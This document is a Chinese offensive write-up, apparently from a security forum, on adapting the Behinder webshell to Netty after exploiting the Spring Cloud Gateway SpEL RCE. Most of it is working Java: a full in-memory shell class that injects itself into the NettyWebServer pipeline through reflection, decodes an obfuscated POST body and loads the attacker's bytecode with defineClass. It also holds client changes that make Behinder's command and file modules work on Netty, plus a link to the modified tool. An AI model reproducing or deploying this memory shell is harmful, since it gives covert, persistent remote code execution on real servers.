**0x00** **前言**
===============

关于SpringCloud GateWay SPEL RCE漏洞的原理，公开分析的内容已经很多了，这里只说漏洞在实战过程中出现的一些问题：  
1.Netty环境下request中完整body的获取问题  
2.Netty环境下response的获取  
3.Netty环境下冰蝎服务端的适配  
4.冰蝎客户端修改  
改版后的冰蝎已经上传至GitHub：GitHub：<https://github.com/shuimuLiu/Behinder-Base65>

**0x01** **环境说明**
=================

<https://github.com/spring-cloud/spring-cloud-gateway/releases/tag/v3.1.0>

**0x02** **漏洞复现**
=================

添加路由  
![image001.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c03b9ef3d6b87837074a514a797b33237a55a839.png)  
刷新路由：  
![image004.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f3611c999931693f374220cf913952d8391c5c80.png)  
访问添加后的路由  
![image007.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-96badfd2cf78822360a04bc5b71419dad29e8af0.png)

**0x03** **适配Demo**
===================

**0.3.1 request获取思路及坑点**  
复现的过程是学习的Y4er师傅，接下来冰蝎的适配则是学习的c0ny1师傅，c0ny1师傅给出的Demo如下：  
![image010.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-4b591a3ef63a9a8dac1be30c952c0e9af81e56a9.png)  
![image012.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f6810e91df8c33c03eb061fc7aea7717a5fa4d42.png)  
![image014.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-8ba6c2ca7a9bef16324caef61b8c9d5695acfd45.png)  
将普通的命令马转为冰蝎马的关键是request和response以及session的获取（下图是冰蝎3.11的fillContext方法，用来保存Request、Response、Session对象）  
![image016.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-488ee94e6d544e557402cadeb7fe22481c2339ec.png)  
DefaultHttpRequest是负责获取除body之外的内容的，Demo中已经给出了request接口，但是在debug的过程中发现request的headers和body和两次获取的  
![image018.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-3c0e5f8e80aec699e8e79608d11d5b171d2f6314.png)

![image020.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a77d97d8fe898ca006ccad48c765b023f51d0b29.png)  
HttpContent是获取post数据包的body内容  
![image022.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-ce750cdd57d09cc2a0f37aaf86508b4a1d0e94d4.png)  
但是当post数据包过大时，HttpContent获取的body内容是分好几次获取的，最后一次获取body内容的类是DefaultLastHttpContent，之前的类是DefaultHttpContent  
POST包的大小36888  
![image024.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-57e19e5e9e4356fcdc8e879bdfcf73ea31a82eeb.png)  
通过控制台打印出每次获取body内容的长度及每次获取body类的名字，代码如下  
![image026.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-92cf9a06eecdc80e5cbeb4208b26b5037c5bc82b.png)  
控制台效果，body总数和Content-Length对应上了，表示获取了完整的body内容：  
![iage028.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c25589c9e4cdd7c6c0eafa4d60849c4a496649f7.png)  
通过实际效果得出结论，POST数据包body过大时，HttpContent获取的body内容是分好几次获取的。

**0.3.2 response的获取**

再看response，netty中的response并不是继承自javax.servlet.ServletResponse  
![image030.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-527f9d7fce29041e019ac615e66023b364bbc690.png)

![image032.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-40674b5e3408ce714c6dde9b308a740d7cb64f97.png)  
那么根据这些内容先编写能够回显POST body数据的代码，读body的代码如下  
![image034.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-64d0851ef985198a43a9fa41a1907fbde10ff50c.png)  
写入回显的代码如下：  
![image036.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-90f41fe502e3747e9ea29ba20265732a52c032d9.png)  
效果如下：  
![image038.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-9e31f84aa4394c07298bfc207bad3897b43629a6.png)  
因为netty的request和response都不是冰蝎中的对应类，而且没有初始化session（待考证），所以这个时候就要改动冰蝎的客户端和服务端，首先是客户端，客户端的改进主要是针对response做类的判断，这里依次修改冰蝎下Java的每个payload模块response做处理，在做处理之前则是需要对response写入的回显过程进行反射变形  
![image040.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6a730bb289d93e6406359bb497e60231a13765ad.png)  
按照c0ny1师傅的Demo对其修改如下：

```php
Class<?> httpObjectClass = Thread.currentThread().getContextClassLoader().loadClass("io.netty.handler.codec.http.HttpVersion");
Class<?> responseStatuClass = Thread.currentThread().getContextClassLoader().loadClass("io.netty.handler.codec.http.HttpResponseStatus");
Class<?> byteBufferClass = Thread.currentThread().getContextClassLoader().loadClass("io.netty.buffer.ByteBuf");
Class<?> responseClass = Thread.currentThread().getContextClassLoader().loadClass("io.netty.handler.codec.http.DefaultFullHttpResponse");
Class<?> unpooledClass = Thread.currentThread().getContextClassLoader().loadClass("io.netty.buffer.Unpooled");
Class<?> listnerClass = Thread.currentThread().getContextClassLoader().loadClass("io.netty.channel.ChannelFutureListener");
Class<?> contextClass = Thread.currentThread().getContextClassLoader().loadClass("io.netty.channel.ChannelOutboundInvoker");
Class<?> GenericClass = Thread.currentThread().getContextClassLoader().loadClass("io.netty.util.concurrent.GenericFutureListener");
Field httpField = httpObjectClass.getDeclaredField("HTTP_1_1");
httpField.setAccessible(true);
Object httpObject = httpField.get(null);
Field httpStatuField = responseStatuClass.getField("OK");
httpStatuField.setAccessible(true);
Object httpStatuObject = httpStatuField.get(null);
Field lisCloseField = listnerClass.getDeclaredField("CLOSE");
lisCloseField.setAccessible(true);
Object lisCloseObject = lisCloseField.get(null);
Method copiedBufferMethod = unpooledClass.getDeclaredMethod("copiedBuffer", new Class[]{java.lang.CharSequence.class, Charset.class});
copiedBufferMethod.setAccessible(true);
Object bufObject = copiedBufferMethod.invoke(null, new Object[]{new String(this.Encrypt(this.buildJson(result, true))), Charset.forName("UTF-8")});
Constructor responseConstructor = responseClass.getDeclaredConstructor(new Class[]{httpObjectClass, responseStatuClass, byteBufferClass});
responseConstructor.setAccessible(true);
Object responseObject = responseConstructor.newInstance(new Object[]{httpObject, httpStatuObject, bufObject});
Method getHeadersMethod = responseObject.getClass().getSuperclass().getSuperclass().getDeclaredMethod("headers", new Class[]{});
getHeadersMethod.setAccessible(true);
Object headersObject = getHeadersMethod.invoke(responseObject);
Method setHeaderMethod = headersObject.getClass().getSuperclass().getDeclaredMethod("set", new Class[]{String.class, Object.class});
setHeaderMethod.setAccessible(true);
setHeaderMethod.invoke(headersObject, new Object[]{"content-type", "text/plain; charset=UTF-8"});
Method addResponseMethod = contextClass.getDeclaredMethod("writeAndFlush", new Class[]{Object.class});
addResponseMethod.setAccessible(true);
Object addListnerObject = addResponseMethod.invoke(Request, responseObject);
Method addListnerMethod = addListnerObject.getClass().getDeclaredMethod("addListener", new Class[]{GenericClass});
addListnerMethod.setAccessible(true);
addListnerMethod.invoke(addListnerObject, lisCloseObject);
```

**0.3.3 response冰蝎适配**

冰蝎日常使用的payload一般用不到request，而netty有没有初始化的session对象，所以这里只修改response了,一般常用的功能命令执行、文件上传、文件查看，这里能修改的都做了修改，冰蝎的Response通过getOutputStream方法写入回显内容  
![image042.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f4b603c3eb92b6cbe3a51ac7b649f6745a36e0f2.png)  
DefaultFullHttpResponse及其父类没有实现getOutputStream方法，所以在冰蝎写入回显的地方做类名判断，以Java的payload中BasicInfo模块为例，原先Response的代码如上图，做类名判断的完整代码如下：

```php
 if (Response.getClass().getName().indexOf("netty") != -1) {
Class<?> httpObjectClass = Thread.currentThread().getContextClassLoader().loadClass("io.netty.handler.codec.http.HttpVersion");
Class<?> responseStatuClass = Thread.currentThread().getContextClassLoader().loadClass("io.netty.handler.codec.http.HttpResponseStatus");
Class<?> byteBufferClass = Thread.currentThread().getContextClassLoader().loadClass("io.netty.buffer.ByteBuf");
Class<?> responseClass = Thread.currentThread().getContextClassLoader().loadClass("io.netty.handler.codec.http.DefaultFullHttpResponse");
Class<?> unpooledClass = Thread.currentThread().getContextClassLoader().loadClass("io.netty.buffer.Unpooled");
Class<?> listnerClass = Thread.currentThread().getContextClassLoader().loadClass("io.netty.channel.ChannelFutureListener");
Class<?> contextClass = Thread.currentThread().getContextClassLoader().loadClass("io.netty.channel.ChannelOutboundInvoker");
Class<?> GenericClass = Thread.currentThread().getContextClassLoader().loadClass("io.netty.util.concurrent.GenericFutureListener");
Field httpField = httpObjectClass.getDeclaredField("HTTP_1_1");
httpField.setAccessible(true);
Object httpObject = httpField.get(null);
Field httpStatuField = responseStatuClass.getField("OK");
httpStatuField.setAccessible(true);
Object httpStatuObject = httpStatuField.get(null);
Field lisCloseField = listnerClass.getDeclaredField("CLOSE");
lisCloseField.setAccessible(true);
Object lisCloseObject = lisCloseField.get(null);
Method copiedBufferMethod = unpooledClass.getDeclaredMethod("copiedBuffer", new Class[]{java.lang.CharSequence.class, Charset.class});
copiedBufferMethod.setAccessible(true);
Object bufObject = copiedBufferMethod.invoke(null, new Object[]{new String(this.Encrypt(this.buildJson(result, true))), Charset.forName("UTF-8")});
Constructor responseConstructor = responseClass.getDeclaredConstructor(new Class[]{httpObjectClass, responseStatuClass, byteBufferClass});
responseConstructor.setAccessible(true);
Object responseObject = responseConstructor.newInstance(new Object[]{httpObject, httpStatuObject, bufObject});
Method getHeadersMethod = responseObject.getClass().getSuperclass().getSuperclass().getDeclaredMethod("headers", new Class[]{});
getHeadersMethod.setAccessible(true);
Object headersObject = getHeadersMethod.invoke(responseObject);
Method setHeaderMethod = headersObject.getClass().getSuperclass().getDeclaredMethod("set", new Class[]{String.class, Object.class});
setHeaderMethod.setAccessible(true);
setHeaderMethod.invoke(headersObject, new Object[]{"content-type", "text/plain; charset=UTF-8"});
Method addResponseMethod = contextClass.getDeclaredMethod("writeAndFlush", new Class[]{Object.class});
addResponseMethod.setAccessible(true);
Object addListnerObject = addResponseMethod.invoke(Request, responseObject);
Method addListnerMethod = addListnerObject.getClass().getDeclaredMethod("addListener", new Class[]{GenericClass});
addListnerMethod.setAccessible(true);
addListnerMethod.invoke(addListnerObject, lisCloseObject);
} else {
so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
write = so.getClass().getMethod("write", byte[].class);
write.invoke(so, this.Encrypt(this.buildJson(result, true)));
so.getClass().getMethod("flush").invoke(so);
so.getClass().getMethod("close").invoke(so);
}
```

冰蝎的其他模块做同样处理即可。

**0.3.4** **冰蝎加密方式及类加载方式修改**

这里给出一种自定义的冰蝎的加密方式如下：  
![image062.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-e6467ce2578003e78dd534bb601bf89dc47dcad9.png)  
加上一种类加载的加密方式的Demo如下：

```php
private void send(ChannelHandlerContext ctx,String message) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, IOException, IOException {
String requestMessage = message;
Object response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK, Unpooled.copiedBuffer("123", CharsetUtil.UTF_8));
Object session = null;
Map<String,Object> objects = new HashMap<String,Object>();
objects.put("session",session);
objects.put("response",response);
objects.put("request",ctx);
Method method = ClassLoader.class.getDeclaredMethod("defineClass",byte[].class,int.class,int.class);
method.setAccessible(true);
String deStr="";
System.out.println(requestMessage.length());
for(int i=0;i<requestMessage.length();i=i+2){
            String str2 = requestMessage.substring(i,i+2);
            char char2 = (char)(Integer.parseInt(str2,16)-1);
            deStr = deStr + char2;
}
byte[] contentBytes = base64De(deStr);
((Class)method.invoke(new URLClassLoader(new URL[]{},this.getClass().getClassLoader()),contentBytes,0,contentBytes.length)).newInstance().equals(objects);
}
```

整体的NettyMemShell的Demo如下：

```php
import io.netty.buffer.Unpooled;
import io.netty.handler.codec.http.*;
import io.netty.util.CharsetUtil;
import reactor.netty.ChannelPipelineConfigurer;
import reactor.netty.ConnectionObserver;

import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.SocketAddress;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.Map;

import io.netty.channel.Channel;
import io.netty.channel.ChannelDuplexHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelPipeline;

public class NettyMemshell extends ChannelDuplexHandler implements ChannelPipelineConfigurer {
    String result = "";
    public static String doInject() {
        String msg = "inject-start";

        try {
            Method getThreads = Thread.class.getDeclaredMethod("getThreads");
            getThreads.setAccessible(true);
            Object threads = getThreads.invoke((Object)null);

            for(int i = 0; i < Array.getLength(threads); ++i) {
                Object thread = Array.get(threads, i);
                if (thread != null && thread.getClass().getName().contains("NettyWebServer")) {
                    Field _val$disposableServer = thread.getClass().getDeclaredField("val$disposableServer");
                    _val$disposableServer.setAccessible(true);
                    Object val$disposableServer = _val$disposableServer.get(thread);
                    Field _config = val$disposableServer.getClass().getSuperclass().getDeclaredField("config");
                    _config.setAccessible(true);
                    Object config = _config.get(val$disposableServer);
                    Field _doOnChannelInit = config.getClass().getSuperclass().getSuperclass().getDeclaredField("doOnChannelInit");
                    _doOnChannelInit.setAccessible(true);
                    _doOnChannelInit.set(config, new NettyMemshell());
                    msg = "inject-success";
                }
            }
        } catch (Exception var10) {
            msg = "inject-error";
        }

        return msg;
    }

    public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, SocketAddress socketAddress) {
        ChannelPipeline pipeline = channel.pipeline();
        pipeline.addBefore("reactor.left.httpTrafficHandler", "memshell_handler", new NettyMemshell());
    }

    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
        String msgClassName = msg.getClass().getName();

        if(msgClassName.indexOf("DefaultHttpContent")!=-1){
            DefaultHttpContent defaultHttpContent = (DefaultHttpContent)msg;
            int bodyLength = defaultHttpContent.content().readableBytes();
            byte[] bytes = new byte[bodyLength];
            defaultHttpContent.content().readBytes(bytes);
            String requestMessage = new String(bytes);
            this.result = this.result + requestMessage;
        }else if (msgClassName.indexOf("DefaultLastHttpContent")!=-1){
            DefaultLastHttpContent defaultLastHttpContent = (DefaultLastHttpContent)msg;
            int bodyLength = defaultLastHttpContent.content().readableBytes();
            byte[] bytes = new byte[bodyLength];
            defaultLastHttpContent.content().readBytes(bytes);
            String requestMessage = new String(bytes);
            this.result = this.result + requestMessage;
            this.send(ctx,this.result);
            return;
        }
        ctx.fireChannelRead(msg);
    }
    private void send(ChannelHandlerContext ctx,String message) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, IOException, IOException {
        String requestMessage = message;
        Object response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK, Unpooled.copiedBuffer("123", CharsetUtil.UTF_8));
        Object session = null;

        Map<String,Object> objects = new HashMap<String,Object>();
        objects.put("session",session);
        objects.put("response",response);
        objects.put("request",ctx);

        Method method = ClassLoader.class.getDeclaredMethod("defineClass",byte[].class,int.class,int.class);
        method.setAccessible(true);
        String deStr="";
        System.out.println(requestMessage.length());
        for(int i=0;i<requestMessage.length();i=i+2){
            String str2 = requestMessage.substring(i,i+2);
            char char2 = (char)(Integer.parseInt(str2,16)-1);
            deStr = deStr + char2;
        }
        byte[] contentBytes = base64De(deStr);
        ((Class)method.invoke(new URLClassLoader(new URL[]{},this.getClass().getClassLoader()),contentBytes,0,contentBytes.length)).newInstance().equals(objects);
    }

    public byte[] base64De(String enString) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException {
        byte[] bytes;
        try {
            Class clazz = Class.forName("java.util.Base64");
            Method method = clazz.getDeclaredMethod("getDecoder");
            Object obj = method.invoke(null);
            method = obj.getClass().getDeclaredMethod("decode", String.class);
            obj = method.invoke(obj, enString);
            bytes = (byte[]) obj;
        } catch (ClassNotFoundException e) {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            Method method = clazz.getMethod("decodeBuffer", String.class);
            Object obj = method.invoke(clazz.newInstance(), enString);
            bytes = (byte[]) obj;
        }
        return bytes;
    }

}
```

整体实现之后通过SPEL重新加入路由，冰蝎连接：

![image072.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-2e53b9a7d78a1a7a2ea53dd7d8d108c2a7334810.png)

**0x04** **主要点总结**
==================

1.channelRead方法中的HttpRequest和DefaultLastHttpContent是分两次获取的；  
2.HttpContent获取的body内容是分好几次获取的，最后一次获取body内容的类是DefaultLastHttpContent，之前的类是DefaultHttpContent；  
2.冰蝎中原生写response的办法不适用于netty，需要做类判断；  
3.netty中好像没有原生的Session对象（待考证），自写一种加密方式。

**0x05** **参考文章**
=================

<https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/>  
<https://y4er.com/post/cve-2022-22947-springcloud-gateway-spel-rce-echo-response/>